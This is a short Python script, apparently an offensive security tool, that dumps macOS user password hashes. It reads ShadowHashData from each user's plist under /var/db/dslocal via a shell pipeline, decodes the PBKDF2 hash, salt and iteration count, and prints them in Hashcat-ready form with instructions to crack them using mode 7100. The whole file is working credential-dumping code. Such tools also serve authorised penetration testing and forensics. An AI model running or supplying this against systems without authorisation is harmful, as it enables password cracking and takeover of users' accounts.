#!/usr/bin/env python3
# Run: pip3 install base64,binascii
import os,argparse,base64,binascii
from xml.etree import ElementTree

plist_dir = "/var/db/dslocal/nodes/Default/users/"

def get_hashes(username,plist_dir):
	path = plist_dir + username

	try:
		filecontent = os.popen("defaults read {0} ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o -".format(path)).read()
		xmltree = ElementTree.fromstring(filecontent)
		
		password_hash_b64 = xmltree[0][1][1].text.split() 
		password_hash_b64_assembled = ''.join(password_hash_b64) 
		decoded_b64_hash = base64.b64decode(password_hash_b64_assembled) 
		decoded_hash = binascii.hexlify(decoded_b64_hash).decode("utf-8") 

		iterations = xmltree[0][1][3].text.split()	
		iterations_assembled = ''.join(iterations)

		salt_b64 = xmltree[0][1][5].text.split() 
		salt_b64_assembled = ''.join(salt_b64)
		decoded_b64_salt = base64.b64decode(salt_b64_assembled)
		decoded_salt = binascii.hexlify(decoded_b64_salt).decode("utf-8")

		#Assemble the hash - the end result is the following: $ml$<iterations>$<salt>$<entropy>
		dumped_hash = "{0}:$ml${1}${2}${3}".format(username.split(".")[0],iterations_assembled,decoded_salt,decoded_hash)
		print(dumped_hash + "\n")
	except:
		print("Error dumping contents for {0}".format(username))



parser = argparse.ArgumentParser(description="""OSX Hash Retrieval Tool. Dumps all password hashes 
												if no -u argument is given. """)
parser.add_argument('-u', metavar="Username",action='store', default=None,
					help="Username to dump the password hash for a specific user")
parser.add_argument('-d',action='store', metavar="Directory",default=None,
					help="Directory to .plists, if non-default")
args = parser.parse_args()

if args.d:
 	plist_dir = args.d

if args.u:
	print("[+] Dumping Hashes!")
	print("[+] Use the '-m 7100 --username' options to crack the hashes with Hashcat.\n")

	username = args.u + ".plist"
	get_hashes(username,plist_dir)


if not args.u and not args.d:
	print("[+] Dumping Hashes!")
	print("[+] Use the '-m 7100 --username' options to crack the hashes with Hashcat.\n")

	user_names = []
	for file in os.listdir(plist_dir):
		if not file.startswith("_"):
			if int((os.path.getsize((plist_dir + file)) > 1500)):
				user_names.append(file)
	for user in user_names:
		get_hashes(user,plist_dir)		
